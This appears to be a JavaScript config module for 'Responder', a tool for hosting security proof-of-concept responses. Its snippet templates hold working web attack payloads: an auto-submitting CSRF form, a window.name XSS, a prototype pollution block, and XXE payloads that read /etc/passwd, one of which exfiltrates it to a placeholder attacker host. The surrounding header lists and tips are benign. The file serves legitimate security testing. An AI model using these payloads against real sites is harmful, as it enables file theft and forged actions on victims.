export const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': '*',
  'Access-Control-Allow-Headers': '*',
};

// https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers
export const HTTP_HEADERS = [
  "Content-Type",
  "Location",
  "Set-Cookie",
  "Content-Security-Policy",
  "Permissions-Policy",
  "Referrer-Policy",
  "X-Frame-Options",
  "Content-Disposition",
  ...Object.keys(CORS_HEADERS),
  "Access-Control-Allow-Credentials",
  "Access-Control-Expose-Headers",
  "Cross-Origin-Embedder-Policy",
  "Cross-Origin-Opener-Policy",
  "Cross-Origin-Resource-Policy",
  "NEL",
  "Link",
  "Refresh",
  "Cache-Control",
  "Timing-Allow-Origin",
  "Report-To",
  "Reporting-Endpoints",
  "Clear-Site-Data",
  "Service-Worker-Allowed",
  "Origin-Agent-Cluster"
]

// https://code.visualstudio.com/docs/editing/userdefinedsnippets
export const SNIPPETS = {
  "html": {
    "!csrf": {
      "description": "Create a Cross-Site Request Forgery template",
      "code": `<form id="form" action="https://\${1:example.com/endpoint}" method="POST">
  <input type="hidden" name="\${2:name}" value="\${3:value}">$0
  <button type="submit">Submit</button>
</form>
<script>
  form.submit()
</script>`
    },
    "!name-xss": {
      "description": "Create a window.name redirect XSS template",
      "code": `<script>
  name = "alert(document.domain)"
  location = "https://\${1:example.com/?payload=eval(name)}"$0
</script>`
    },
    "onclick": {
      "description": "<script> tag with onclick= event handler",
      "code": `<script>
  onclick = () => {
    $0
  }
</script>`
    }
  },
  "json": {
    "!proto": {
      "description": "Insert a __proto__ and prototype.constructor property",
      "code": `"__proto__": {
  "$1": $2
},
"constructor": {
  "prototype": {
    "$1": $2
  }
}$0`
    }
  },
  "xml": {
    "!xxe-oob": {
      "description": "Insert an Out-Of-Band XXE file read payload (DTD)",
      "code": `<!ENTITY % file SYSTEM "file://$\{1:/etc/passwd}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://\${2:web-attacker.com}/?%file;'>">
%eval;
%exfiltrate;`
    },
    "!xxe-error": {
      "description": "Insert an error-based XXE file read payload (DTD)",
      "code": `<!ENTITY % file SYSTEM "file://$\{1:/etc/passwd}">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;`
    }
  },
  "css": {
    "!poc": {
      "description": "visual Proof of Concept: color everything red/blue",
      "code": `* {
  color: red !important;
  background-color: blue !important;
}`
    }
  }
}

export const TIPS = [{
  "title": "What is Responder?",
  "description": "Easily create and share Proof of Concepts in HTML, JavaScript or any other response with custom headers, all via query parameters",
}].concat(shuffle([
  {
    "title": "Tip: Snippets",
    "description": "Press Ctrl+Space to see available snippets inside the editor",
  },
  {
    "title": "Tip: CORS",
    "description": "Press the CORS button to quickly add all Cross-Origin Resource Sharing headers",
  },
  {
    "title": "Tip: Preview",
    "description": "Press the Preview button to see the rendered output of your code in real-time",
  },
  {
    "title": "Tip: Redirects",
    "description": "Use the Location header with a 301 or 302 status code to redirect the browser",
  },
  {
    "title": "Tip: Content-Type",
    "description": "The file extension automatically chooses a Content-Type header, but it can be customized",
  }
]))

export function hasCORS(headers) {
  return Object.entries(CORS_HEADERS).every(([name, value]) => headers.value.get(name) === value)
}

// Mirrored in src/lib.rs -> HEADER_ALIAS: HashMap
export const HEADER_ALIAS = {
  "content-type": "ct",
  "set-cookie": "c",
  "location": "l",
  "content-security-policy": "csp",
}

export function shuffle(array) {
  return array.map(value => ({ value, sort: Math.random() }))
    .sort((a, b) => a.sort - b.sort)
    .map(({ value }) => value)
}
